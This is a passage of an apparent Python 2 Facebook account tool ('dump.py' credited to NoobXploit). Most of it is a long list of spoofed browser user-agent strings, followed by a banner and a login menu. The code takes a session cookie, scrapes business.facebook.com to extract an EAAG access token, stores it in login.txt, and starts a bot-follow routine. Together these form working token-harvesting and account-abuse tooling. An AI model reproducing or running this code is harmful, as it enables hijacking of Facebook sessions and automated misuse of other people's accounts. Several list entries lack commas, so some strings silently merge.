  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
  "Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530"
  "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
  "Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
  "NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
  "Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36"
]
ua=random.choice(agents)
# Logo
___logo___ = ("""%s \n \n%s  \n%s  \n%s
    _   __            __   _  __       __      _ __ 
   / | / /___  ____  / /_ | |/ /____  / /___  (_) /_
  /  |/ / __ \/ __ \/ __ \|   // __ \/ / __ \/ / __/
 / /|  / /_/ / /_/ / /_/ /   |/ /_/ / / /_/ / / /_  
/_/ |_/\____/\____/_.___/_/|_/ .___/_/\____/_/\__/  
                            /_/
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : Riyajul Islam
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : Dev's Community 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : NoobXploit
\033[1;90m══════════════════════════════════════════════════              
"""%(C,R,G,P))

# Container
loop = 0
ok = []
cp = []

# Login
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s1%s]%s Login Use Token"%(B,P,B,P))
    print("%s[%s2%s]%s Login Use Cookie"%(B,P,B,P))
    print("%s[%s3%s]%s Get Tokens Or Cookies"%(B,P,B,P))
    print("%s[%s4%s]%s Exit"%(K,P,K,P))
    ___login___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ___token___ = raw_input("%s[%s?%s]%s Token :%s "%(B,P,B,P,K))
            if ___token___ in ['',' ']:
                exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
            xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
            print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
            open('login.txt','w').write(___token___)
            ___follow___()
        except (KeyError):
            exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
    elif ___login___ in ['2','02']:
        try:
            ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
            if ___cookie___ in ['',' ']:
                exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
            # Terimakasih untuk dullah!
            data = requests.get('https://business.facebook.com/business_locations', headers = {
                'user-agent'                : ua,
                'referer'                   : 'https://www.facebook.com/',
                'host'                      : 'business.facebook.com',
                'origin'                    : 'https://business.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
            }, cookies = {
                'cookie'                    : ___cookie___
            })
            find_token = re.search('(EAAG\w+)', data.text)
            if find_token is None:
                exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
            open('login.txt','w').write(find_token.group(1))
            try:
                xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(find_token.group(1))).json()
                print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
                ___follow___()
            except (KeyError):
                exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (AttributeError,UnboundLocalError):
            exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
    elif ___login___ in ['3','03']:
        print("%s[%s?%s]%s You Will Be Redirected To Facebook Or Browser"%(B,H,B,P));sleep(2)
        os.system('xdg-open https://www.facebook.com/NoobXploit')
        exit("%s[%s!%s]%s Retype %sÂ«%spython2 dump.py%sÂ»"%(B,K,B,P,H,P,H))
    elif ___login___ in ['4','04']:
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Bot Follow
def ___follow___():
    try:
        ___token___ = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        web = datetime.datetime.now()
        ___waktu___ = web.strftime("%H:%M:%S/%d-%m-%Y")
        ___hour___ = web.hour
        if 06 <= ___hour___ < 11:
            ___say___ = ('Good morning ðŸ’™')
        elif 11 <= ___hour___ < 15:
            ___say___ = (' Good afternoon ðŸ’›')
        elif 15 <= ___hour___ < 18:
            ___say___ = ('Good Afternoon ðŸ§¡')
        else:
            ___say___ = ('Good Evening ðŸ–¤')
